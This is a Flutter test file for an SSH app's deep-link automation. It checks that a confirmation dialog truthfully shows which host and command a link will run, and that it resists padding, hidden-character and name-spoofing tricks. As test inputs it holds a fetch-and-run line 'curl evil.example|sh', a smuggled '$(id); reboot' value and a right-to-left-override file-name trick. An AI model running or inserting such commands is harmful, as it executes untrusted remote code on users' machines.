import 'dart:io';

import 'package:drift/drift.dart' hide isNull, isNotNull;
import 'package:drift/native.dart';
import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:go_router/go_router.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:zestssh/database/database.dart';
import 'package:zestssh/features/automation/automation_link_question.dart';
import 'package:zestssh/l10n/generated/app_localizations.dart';
import 'package:zestssh/models/workflow.dart';
import 'package:zestssh/providers/automation_provider.dart';
import 'package:zestssh/providers/core_providers.dart';
import 'package:zestssh/providers/purchase_providers.dart';
import 'package:zestssh/providers/settings_providers.dart';
import 'package:zestssh/services/deep_link_service.dart';
import 'package:zestssh/utils/redactor.dart';
import 'package:zestssh/utils/hidden_characters.dart';

/// A `zestssh://` automation link asks its person before anything runs (3.0,
/// found while comparing the five platforms' versions). Nothing in the
/// app answered the question the links ask (DeepLinkService.
/// onAutomationRequested) since they came in, so every one was refused, on
/// every platform. Now the app answers it: a question naming what the link
/// runs and where, in your Tree's words, masked while the screen is
/// recorded; nothing while the app is locked.
class _Pro extends StateNotifier<bool> implements ProStatusNotifier {
  _Pro(super.state);

  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}

void main() {
  driftRuntimeOptions.dontWarnAboutMultipleDatabases = true;
  final l10n = lookupAppLocalizations(const Locale('en'));
  final at = DateTime(2026, 10, 16);
  late AppDatabase tree;

  setUp(() async {
    FlutterSecureStorage.setMockInitialValues({});
    tree = AppDatabase.forTesting(NativeDatabase.memory());
    for (final (id, label) in [('h-web', 'Payroll web'), ('h-db', 'Payroll db')]) {
      await tree.into(tree.connections).insert(ConnectionsCompanion.insert(
          id: id, label: label, host: '$id.example.com', createdAt: at, updatedAt: at));
    }
    await tree.into(tree.snippets).insert(SnippetsCompanion.insert(
        id: 's-1', label: 'Restart web', command: 'sudo systemctl restart nginx', createdAt: at, updatedAt: at));
    await tree.into(tree.snippets).insert(SnippetsCompanion.insert(
        id: 's-2', label: 'Note', command: 'logger -t zest {{msg}}', createdAt: at, updatedAt: at));
  });

  tearDown(() async {
    DeepLinkService.onAutomationRequested = null;
    Redactor.instance.enabled = false;
    await tree.close();
  });

  /// The app on screen, its links answered as the app answers them: with
  /// Squeezed ([pro]) and automation turned on ([automation]) unless said.
  /// The container it runs in.
  Future<ProviderContainer> app(WidgetTester tester,
      {bool locked = false, bool recording = false, bool automation = true, bool pro = true}) async {
    SharedPreferences.setMockInitialValues({
      if (recording) 'recording_mode_enabled': true,
      'automation_enabled': automation,
    });
    final prefs = await SharedPreferences.getInstance();
    final c = ProviderContainer(overrides: [
      sharedPreferencesProvider.overrideWithValue(prefs),
      isProProvider.overrideWith((ref) => _Pro(pro)),
      databaseSessionProvider.overrideWith((ref) {
        final session = DatabaseSessionNotifier();
        if (!locked) session.seed(tree);
        return session;
      }),
    ]);
    addTearDown(c.dispose);
    late final GoRouter router;
    router = GoRouter(routes: [
      GoRoute(
        path: '/',
        builder: (context, state) => Consumer(builder: (context, ref, _) {
          answerAutomationLinks(ref, () => router);
          return const Scaffold(body: Text('home'));
        }),
      ),
    ]);
    addTearDown(router.dispose);
    await tester.pumpWidget(UncontrolledProviderScope(
      container: c,
      child: MaterialApp.router(
        routerConfig: router,
        localizationsDelegates: AppLocalizations.localizationsDelegates,
        supportedLocales: AppLocalizations.supportedLocales,
        locale: const Locale('en'),
      ),
    ));
    await tester.pumpAndSettle();
    return c;
  }

  /// [link] opened: the question it asks, answered with [answer] (null:
  /// none asked). What the link hands on to automation.
  Future<(String?, Map<String, dynamic>?)> opened(WidgetTester tester, String link, {String? answer}) async {
    final params = DeepLinkService.extractAutomationParams(Uri.parse(link));
    await tester.pumpAndSettle();
    String? asked;
    if (find.text(l10n.automationLinkTitle).evaluate().isNotEmpty) {
      final body = find.descendant(of: find.byType(Dialog), matching: find.byType(Text));
      asked = [for (final t in body.evaluate()) (t.widget as Text).data ?? ''].join(' | ');
      await tester.tap(find.text(answer ?? l10n.cancel));
      await tester.pumpAndSettle();
    }
    return (asked, await params);
  }

  testWidgets('a command on a host: asked first, naming the host as your Tree has it and the command; Run lets it '
      'through, Cancel does not', (tester) async {
    await app(tester);
    var (asked, params) = await opened(tester, 'zestssh://execute?connection=h-web&command=uptime&key=k-1',
        answer: l10n.automationLinkRun);
    expect(asked, contains(l10n.automationLinkOnHost('Payroll web')));
    expect(asked, contains('uptime'));
    expect(asked, contains(l10n.automationLinkOnlyYours));
    expect(params, {'action': 'execute', 'connection_id': 'h-web', 'command': 'uptime', 'timeout': 30, 'key': 'k-1'});

    (asked, params) = await opened(tester, 'zestssh://execute?connection=Payroll%20db&command=uptime');
    expect(asked, contains(l10n.automationLinkOnHost('Payroll db')), reason: 'found by its name too');
    expect(params, isNull, reason: 'cancelled: nothing runs');
  });

  // What the question showed was not always what runs (found in a
  // security review).
  group('what the question shows is what runs', () {
    Future<String> workflow(String id, String name) async {
      await tree.workflowsDao.upsert(WorkflowsCompanion.insert(id: id, name: name, createdAt: at));
      return id;
    }

    testWidgets('a workflow named one way and identified another: it names the one the id finds, which runs',
        (tester) async {
      await workflow('w-harmless', 'Harmless');
      await workflow('w-destroy', 'Destroy everything');
      await app(tester);
      final (asked, params) = await opened(tester, 'zestssh://workflow?name=Harmless&id=w-destroy', answer: l10n.automationLinkRun);
      expect(asked, contains('Destroy everything'));
      expect(asked, isNot(contains('Harmless')));
      expect(params?['workflow_id'], 'w-destroy');
    });

    testWidgets('a blank name with an id: it names the workflow, not nothing', (tester) async {
      await workflow('w-destroy', 'Destroy everything');
      await app(tester);
      final (asked, _) = await opened(tester, 'zestssh://workflow?name=&id=w-destroy');
      expect(asked, contains('Destroy everything'));
    });

    testWidgets('an id that finds none falls to the name, in the question as in the run', (tester) async {
      await workflow('w-1', 'Nightly');
      await app(tester);
      final (asked, _) = await opened(tester, 'zestssh://workflow?name=nightly&id=no-such-id');
      expect(asked, contains('Nightly'));
    });

    test('the lookup the question and the run share: the id first, then the name in any case', () {
      Workflow w(String id, String name) => Workflow(id: id, name: name, steps: const [], createdAt: at);
      final all = [w('a', 'First'), w('b', 'Second')];
      expect(workflowOfLink(all, id: 'b', name: 'first')?.name, 'Second');
      expect(workflowOfLink(all, id: 'nope', name: 'FIRST')?.name, 'First');
      expect(workflowOfLink(all, id: '', name: 'second')?.name, 'Second');
      expect(workflowOfLink(all, name: 'nope'), isNull);
      expect(workflowOfLink(all), isNull);
    });

    testWidgets('a command padded with line breaks: they show as \\n, and what runs stays in view above Run',
        (tester) async {
      tester.view.physicalSize = const Size(1280, 800);
      tester.view.devicePixelRatio = 1;
      addTearDown(tester.view.reset);
      await app(tester);
      const evil = 'curl evil.example|sh';
      final link = Uri(
        scheme: 'zestssh',
        host: 'execute',
        queryParameters: {'connection': 'h-web', 'command': 'uptime${'\n' * 200}$evil', 'key': 'K'},
      );
      final params = DeepLinkService.extractAutomationParams(link);
      await tester.pumpAndSettle();
      final text = find.byWidgetPredicate((w) => w is Text && (w.data ?? '').contains(evil));
      expect(text, findsOneWidget);
      expect(tester.widget<Text>(text).data, contains(r'uptime\n\n'), reason: 'as the two characters');
      final view = tester.getRect(find.byKey(const ValueKey('zest-confirm-body')));
      final para = tester.renderObject<RenderParagraph>(find.descendant(of: text, matching: find.byType(RichText)));
      final body = tester.widget<Text>(text).data!;
      final y = para.localToGlobal(para.getOffsetForCaret(TextPosition(offset: body.indexOf(evil)), Rect.zero)).dy;
      expect(y, lessThan(view.bottom), reason: 'what runs is in the part of the body that shows');
      await tester.tap(find.text(l10n.cancel));
      await tester.pumpAndSettle();
      await params;
    });

    testWidgets('Enter does not answer it: nothing has the keyboard as it comes up', (tester) async {
      await app(tester);
      final params = DeepLinkService.extractAutomationParams(
          Uri.parse('zestssh://execute?connection=h-web&command=uptime&key=K'));
      await tester.pumpAndSettle();
      expect(find.text(l10n.automationLinkTitle), findsOneWidget);
      await tester.sendKeyEvent(LogicalKeyboardKey.enter);
      await tester.pumpAndSettle();
      expect(find.text(l10n.automationLinkTitle), findsOneWidget, reason: 'still asking');
      await tester.tap(find.text(l10n.cancel));
      await tester.pumpAndSettle();
      expect(await params, isNull);
    });
  });

  testWidgets('a snippet: the command it runs is shown; several hosts: every one named; a workflow: its name',
      (tester) async {
    await app(tester);
    var (asked, params) = await opened(tester, 'zestssh://snippet?connection=h-db&name=restart%20WEB',
        answer: l10n.automationLinkRun);
    expect(asked, contains(l10n.automationLinkSnippetOn('restart WEB', 'Payroll db')));
    expect(asked, contains('sudo systemctl restart nginx'));
    expect(params?['snippet_name'], 'restart WEB');

    (asked, params) = await opened(tester, 'zestssh://batch?connections=h-web,h-db&command=df%20-h',
        answer: l10n.automationLinkRun);
    expect(asked, contains(l10n.automationLinkOnHosts('Payroll web, Payroll db')));
    expect(asked, contains('df -h'));
    expect(params?['connection_ids'], ['h-web', 'h-db']);

    (asked, params) = await opened(tester, 'zestssh://workflow?name=Nightly%20check', answer: l10n.automationLinkRun);
    expect(asked, contains(l10n.automationLinkWorkflow('Nightly check')));
    expect(params?['workflow_name'], 'Nightly check');
  });

  testWidgets("a snippet's command is shown with the link's values in it, as it runs", (tester) async {
    // It was shown without them: the values a link brings ran unseen (found
    // in a security review).
    await app(tester);
    final (asked, params) = await opened(
        tester, 'zestssh://snippet?connection=h-db&name=Note&var_msg=%24(id)%3B%20reboot&var_unused=x',
        answer: l10n.automationLinkRun);
    expect(asked, contains("logger -t zest '\$(id); reboot'"));
    expect(asked, isNot(contains('{{msg}}')));
    expect(params?['var_msg'], r'$(id); reboot');
  });

  testWidgets('while the screen is recorded, recording is turned off first, or nothing is asked or run; turned off, '
      'the host and the command are shown as they are (stand-ins were shown, and the real command ran on '
      'Run)', (tester) async {
    await app(tester, recording: true);
    const link = 'zestssh://execute?connection=h-web&command=cat%20/srv/payroll.env';
    var params = DeepLinkService.extractAutomationParams(Uri.parse(link));
    await tester.pumpAndSettle();
    expect(find.text(l10n.recModeRevealTitle), findsOneWidget);
    await tester.tap(find.text(l10n.recModeRevealCancel));
    await tester.pumpAndSettle();
    expect(find.text(l10n.automationLinkTitle), findsNothing);
    expect(await params, isNull, reason: 'nothing runs');

    params = DeepLinkService.extractAutomationParams(Uri.parse(link));
    await tester.pumpAndSettle();
    await tester.tap(find.text(l10n.recModeRevealDisable));
    await tester.pumpAndSettle();
    final body = find.descendant(of: find.byType(Dialog), matching: find.byType(Text));
    final asked = [for (final t in body.evaluate()) (t.widget as Text).data ?? ''].join(' | ');
    expect(asked, contains(l10n.automationLinkOnHost('Payroll web')));
    expect(asked, contains('cat /srv/payroll.env'));
    await tester.tap(find.text(l10n.cancel));
    await tester.pumpAndSettle();
    expect(await params, isNull);
  });

  test('what a question shows of a command: a hidden character as its code; a line break and a tab as they are', () {
    expect(withHiddenCharactersShown('a\tb\nc\u0000d\u007fe\u0085f\u200bg\u2066h\ufeffi\u00adj'),
        'a\tb\nc\\0d\\x7fe\\u0085f\\u200bg\\u2066h\\ufeffi\\u00adj');
    expect(withHiddenCharactersShown('sudo systemctl restart nginx'), 'sudo systemctl restart nginx');
  });

  testWidgets('a command with characters that hide or reorder what it says is shown with them as their codes',
      (tester) async {
    await app(tester);
    final (asked, _) = await opened(
        tester, 'zestssh://execute?connection=h-web&command=${Uri.encodeComponent('ls \u202Etxt.exe\u0007 -la')}');
    expect(asked, contains(r'ls \u202etxt.exe\x07 -la'));
  });

  testWidgets('while the app is locked: nothing is asked, and nothing runs', (tester) async {
    await app(tester, locked: true);
    final (asked, params) = await opened(tester, 'zestssh://execute?connection=h-web&command=uptime');
    expect((asked, params), (null, null));
  });

  // The question was asked with automation off, and Run then ran nothing
  // (found when checking the whitepaper): nothing is asked, and
  // the refusal says it is off, as for any request while it is.
  testWidgets('with automation off: nothing is asked and nothing runs, and it is said to be off', (tester) async {
    final c = await app(tester, automation: false);
    final seen = <AutomationBlocked?>[];
    c.listen<AutomationState>(automationProvider, (_, next) => seen.add(next.blocked));
    for (final link in [
      'zestssh://execute?connection=h-web&command=uptime&key=k-1',
      'zestssh://snippet?connection=h-db&name=Restart%20web',
      'zestssh://batch?connections=h-web,h-db&command=uptime',
      'zestssh://workflow?name=Nightly%20check',
    ]) {
      final (asked, params) = await opened(tester, link);
      expect((asked, params), (null, null), reason: link);
      expect(seen.last, AutomationBlocked.off, reason: link);
      c.read(automationProvider.notifier).clearBlocked();
    }
    expect(find.byType(Dialog), findsNothing);
  });

  testWidgets('without Squeezed: nothing is asked and nothing runs, and that is said', (tester) async {
    final c = await app(tester, pro: false);
    final (asked, params) = await opened(tester, 'zestssh://execute?connection=h-web&command=uptime');
    expect((asked, params), (null, null));
    expect(c.read(automationProvider).blocked, AutomationBlocked.needsSqueezed);
  });

  testWidgets('turned on again, the question is asked again', (tester) async {
    final c = await app(tester, automation: false);
    expect((await opened(tester, 'zestssh://execute?connection=h-web&command=uptime')).$1, isNull);
    c.read(automationProvider.notifier).clearBlocked();
    c.read(automationEnabledProvider.notifier).set(true);
    final (asked, _) = await opened(tester, 'zestssh://execute?connection=h-web&command=uptime');
    expect(asked, contains(l10n.automationLinkOnHost('Payroll web')));
    expect(c.read(automationProvider).blocked, isNull);
  });

  test('the app answers the links it is handed', () {
    final app = File('lib/app.dart').readAsStringSync();
    expect(app, contains('answerAutomationLinks(ref, () => ref.read(routerProvider));'));
  });
}
